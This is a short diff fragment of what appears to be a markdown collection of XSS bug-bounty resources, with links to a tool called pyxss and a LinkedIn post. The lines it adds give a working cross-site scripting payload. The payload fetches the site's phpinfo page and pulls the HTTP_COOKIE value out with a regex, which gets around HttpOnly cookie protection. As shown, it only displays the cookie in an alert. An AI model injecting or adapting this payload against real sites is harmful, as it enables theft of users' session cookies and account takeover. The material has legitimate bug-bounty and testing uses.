@@ -221,6 +221,14 @@ pyxss: https://lnkd.in/gxb8y3eU
 [linked_in_post](https://www.linkedin.com/posts/michael-vincent-franco-a35215216_xss-bugbounty-automation-activity-7371382181757321216-aKYj/?utm_source=share&utm_medium=member_desktop&rcm=ACoAAEvbB6gBsfqHvlwzrauR1IimSlFa7C0L4ok)
 
 
+---
+---
+
+## xss form phpinfo page
+
+```js
+XSS Payload: <script>fetch('/phpinfo.php').then(r=>r.text()).then(t=>alert((/HTTP_COOKIE\s*<\/td>\s*<td class="v">(.*?)<\/td>/.exec(t)||[])[1]||'Not found'));</script>
+```
 
 
 
